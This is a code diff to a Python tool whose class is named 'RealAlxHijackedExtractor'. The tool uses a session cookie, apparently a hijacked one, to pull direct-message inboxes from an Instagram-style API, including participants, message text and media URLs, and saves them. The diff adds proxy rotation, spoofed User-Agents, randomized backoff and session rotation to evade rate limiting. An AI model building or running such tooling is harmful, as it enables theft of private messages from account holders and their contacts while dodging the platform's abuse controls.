@@ -10,6 +10,41 @@ import time
 import sqlite3
 from datetime import datetime
 import os
+import random  # for backoff and proxy rotation
+
+# Load proxy list if available
+PROXIES = []
+if os.path.exists("proxies.txt"):
+    with open("proxies.txt") as f:
+        PROXIES = [line.strip() for line in f if line.strip()]
+
+# User-Agent rotation pool
+UAS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...",
+    "Instagram 123.0.0.26.121 Android (29/10;...)",
+    # add more user-agent strings as needed
+]
+
+MAX_RETRIES = 5
+
+def smart_wait(attempt):
+    """Randomized delay + exponential backoff"""
+    base = random.uniform(1, 5)
+    backoff = min(60, base * (2 ** attempt))
+    jitter = random.uniform(0, 1)
+    time.sleep(backoff + jitter)
+
+
+def new_session(token=None):
+    """Create session with optional proxy and UA rotation"""
+    s = requests.Session()
+    if PROXIES:
+        proxy = random.choice(PROXIES)
+        s.proxies.update({"http": proxy, "https": proxy})
+    s.headers.update({"User-Agent": random.choice(UAS)})
+    if token:
+        s.cookies.update({"sessionid": token})
+    return s
 
 class RealAlxHijackedExtractor:
     def __init__(self):
@@ -189,93 +224,108 @@ class RealAlxHijackedExtractor:
         }
         
         for endpoint in dm_endpoints:
+            attempt = 0
+            while attempt < MAX_RETRIES:
+                try:
+                    print(f"🔍 Testing endpoint: {endpoint}")
+                    response = session.get(endpoint, timeout=30)
+                    response.raise_for_status()
+                    data = response.json()
+                    break  # successful fetch
+                except requests.exceptions.HTTPError as e:
+                    status = getattr(response, 'status_code', None)
+                    if status == 429:
+                        print(f"[!] Rate-limit hit at {endpoint}, backoff & retry #{attempt+1}")
+                        smart_wait(attempt)
+                        # rotate session on retry
+                        session = new_session(token=session.cookies.get('sessionid'))
+                        attempt += 1
+                        continue
+                    else:
+                        print(f"[x] HTTP error {status} on {endpoint}")
+                        raise
+                except Exception as e:
+                    print(f"[x] Error fetching {endpoint}: {e}")
+                    raise
+            else:
+                print(f"[x] Skipping {endpoint} after {MAX_RETRIES} retries")
+                continue
+            
+            # ...existing processing of data...
             try:
-                print(f"🔍 Testing endpoint: {endpoint}")
-                response = session.get(endpoint, timeout=30)
+                data = response.json()
                 
-                print(f"   Status: {response.status_code}")
-                
-                if response.status_code == 200:
-                    try:
-                        data = response.json()
+                if 'inbox' in data and 'threads' in data['inbox']:
+                    threads = data['inbox']['threads']
+                    print(f"   ✅ Found {len(threads)} threads!")
+                    
+                    for thread in threads:
+                        thread_info = {
+                            'thread_id': thread.get('thread_id', ''),
+                            'thread_title': thread.get('thread_title', ''),
+                            'users': [],
+                            'messages': [],
+                            'last_activity': thread.get('last_activity_at', ''),
+                            'extraction_endpoint': endpoint
+                        }
                         
-                        if 'inbox' in data and 'threads' in data['inbox']:
-                            threads = data['inbox']['threads']
-                            print(f"   ✅ Found {len(threads)} threads!")
-                            
-                            for thread in threads:
-                                thread_info = {
-                                    'thread_id': thread.get('thread_id', ''),
-                                    'thread_title': thread.get('thread_title', ''),
-                                    'users': [],
-                                    'messages': [],
-                                    'last_activity': thread.get('last_activity_at', ''),
-                                    'extraction_endpoint': endpoint
+                        # Extract participants
+                        if 'users' in thread:
+                            for user in thread['users']:
+                                thread_info['users'].append({
+                                    'user_id': user.get('pk', ''),
+                                    'username': user.get('username', ''),
+                                    'full_name': user.get('full_name', ''),
+                                    'is_private': user.get('is_private', False)
+                                })
+                        
+                        # Extract messages
+                        if 'items' in thread:
+                            for item in thread['items']:
+                                message = {
+                                    'message_id': item.get('item_id', ''),
+                                    'thread_id': thread_info['thread_id'],
+                                    'user_id': item.get('user_id', ''),
+                                    'timestamp': item.get('timestamp', ''),
+                                    'item_type': item.get('item_type', ''),
+                                    'content': '',
+                                    'media_url': ''
                                 }
                                 
-                                # Extract participants
-                                if 'users' in thread:
-                                    for user in thread['users']:
-                                        thread_info['users'].append({
-                                            'user_id': user.get('pk', ''),
-                                            'username': user.get('username', ''),
-                                            'full_name': user.get('full_name', ''),
-                                            'is_private': user.get('is_private', False)
-                                        })
+                                # Extract text content
+                                if item.get('item_type') == 'text' and 'text' in item:
+                                    message['content'] = item['text']
                                 
-                                # Extract messages
-                                if 'items' in thread:
-                                    for item in thread['items']:
-                                        message = {
-                                            'message_id': item.get('item_id', ''),
-                                            'thread_id': thread_info['thread_id'],
-                                            'user_id': item.get('user_id', ''),
-                                            'timestamp': item.get('timestamp', ''),
-                                            'item_type': item.get('item_type', ''),
-                                            'content': '',
-                                            'media_url': ''
-                                        }
-                                        
-                                        # Extract text content
-                                        if item.get('item_type') == 'text' and 'text' in item:
-                                            message['content'] = item['text']
-                                        
-                                        # Extract media
-                                        elif item.get('item_type') == 'media' and 'media' in item:
-                                            media = item['media']
-                                            if 'image_versions2' in media and 'candidates' in media['image_versions2']:
-                                                message['media_url'] = media['image_versions2']['candidates'][0].get('url', '')
-                                        
-                                        thread_info['messages'].append(message)
-                                        extracted_data['messages'].append(message)
+                                # Extract media
+                                elif item.get('item_type') == 'media' and 'media' in item:
+                                    media = item['media']
+                                    if 'image_versions2' in media and 'candidates' in media['image_versions2']:
+                                        message['media_url'] = media['image_versions2']['candidates'][0].get('url', '')
                                 
-                                extracted_data['threads'].append(thread_info)
-                            
-                            # Save data immediately
-                            self.save_extraction_data(extracted_data, token)
-                            return extracted_data
+                                thread_info['messages'].append(message)
+                                extracted_data['messages'].append(message)
                         
-                        elif 'threads' in data:
-                            threads = data['threads']
-                            print(f"   ✅ Found {len(threads)} threads (direct format)!")
-                            # Handle direct threads format...
-                            
-                        else:
-                            print(f"   ⚠️ No threads found in response")
-                            
-                    except json.JSONDecodeError:
-                        print(f"   ⚠️ Non-JSON response")
-                        # Save HTML for debugging
-                        debug_file = f"{self.output_dir}/debug_{endpoint.replace('/', '_')}_{int(time.time())}.html"
-                        with open(debug_file, 'w') as f:
-                            f.write(response.text)
-                        print(f"   📁 Debug saved: {debug_file}")
-                
-                else:
-                    print(f"   ❌ HTTP {response.status_code}")
+                        extracted_data['threads'].append(thread_info)
                     
-            except Exception as e:
-                print(f"   ❌ Error: {e}")
+                    # Save data immediately
+                    self.save_extraction_data(extracted_data, token)
+                    return extracted_data
+                
+                elif 'threads' in data:
+                    threads = data['threads']
+                    print(f"   ✅ Found {len(threads)} threads (direct format)!")
+                    # Handle direct threads format...
+                    
+                else:
+                    print(f"   ⚠️ No threads found in response")
+                    
+            except json.JSONDecodeError:
+                print(f"   ⚠️ Non-JSON response")
+                # Save HTML for debugging
+                debug_file = f"{self.output_dir}/debug_{endpoint.replace('/', '_')}_{int(time.time())}.html"
+                with open(debug_file, 'w') as f:
+                    f.write(response.text)
+                print(f"   📁 Debug saved: {debug_file}")
         
         return extracted_data
     
